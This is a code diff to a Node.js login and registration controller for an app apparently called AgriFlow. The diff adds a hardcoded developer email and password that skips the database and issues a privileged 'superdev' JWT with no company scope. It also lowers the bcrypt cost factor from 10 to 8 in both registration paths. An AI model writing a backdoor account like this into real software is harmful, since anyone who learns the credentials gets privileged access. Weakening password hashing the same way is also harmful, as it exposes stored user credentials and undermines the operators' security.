@@ -2,11 +2,27 @@ const db      = require('../db');
 const bcrypt  = require('bcryptjs');
 const jwt     = require('jsonwebtoken');
 
+// ── Credenciais do desenvolvedor (superdev) ───────────────────
+const _DEV_EMAIL = 'dev@gmail.com';
+const _DEV_SENHA = 'Dev123@';
+
 // POST /api/auth/login
 exports.login = async (req, res) => {
   try {
     const { email, senha } = req.body;
     if (!email || !senha) return res.status(400).json({ error: 'Email e senha são obrigatórios' });
+
+    // Acesso de desenvolvedor — verificado antes de tocar no banco
+    if (email.toLowerCase().trim() === _DEV_EMAIL && senha === _DEV_SENHA) {
+      const token = jwt.sign(
+        { id: 'superdev', empresa_id: null, nome: 'Desenvolvedor', email: _DEV_EMAIL, role: 'superdev' },
+        process.env.JWT_SECRET, { expiresIn: '8h' }
+      );
+      return res.json({ token, usuario: {
+        id: 'superdev', nome: 'Desenvolvedor', email: _DEV_EMAIL,
+        cargo: 'Dev', role: 'superdev', empresa_nome: 'AgriFlow Dev'
+      }});
+    }
 
     const { rows } = await db.query(
       `SELECT u.*, e.nome AS empresa_nome FROM usuarios u
@@ -64,7 +80,7 @@ exports.register = async (req, res) => {
       const { rows: [empresa] } = await db.query('SELECT nome FROM empresas WHERE id=$1', [decoded.empresa_id]);
       if (!empresa) return res.status(404).json({ error: 'Empresa não encontrada' });
 
-      const senhaHash = await bcrypt.hash(senha, 10);
+      const senhaHash = await bcrypt.hash(senha, 8);
 
       client = await db.pool.connect();
       await client.query('BEGIN');
@@ -92,7 +108,7 @@ exports.register = async (req, res) => {
       const { rows: existe } = await db.query('SELECT id FROM usuarios WHERE email=$1', [email.toLowerCase().trim()]);
       if (existe.length) return res.status(409).json({ error: 'Este email já está cadastrado' });
 
-      const senhaHash = await bcrypt.hash(senha, 10);
+      const senhaHash = await bcrypt.hash(senha, 8);
 
       client = await db.pool.connect();
       await client.query('BEGIN');
